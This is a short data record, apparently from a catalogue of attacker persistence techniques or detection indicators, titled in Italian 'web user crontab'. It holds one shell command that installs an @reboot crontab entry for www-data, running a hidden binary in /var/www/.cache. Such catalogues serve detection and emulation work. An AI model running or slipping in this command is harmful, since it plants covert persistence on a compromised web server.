# category: persistence
# title: Crontab dell'utente web
# indicator: crontabs/www-data
echo '@reboot /var/www/.cache/agent' | crontab -u www-data -
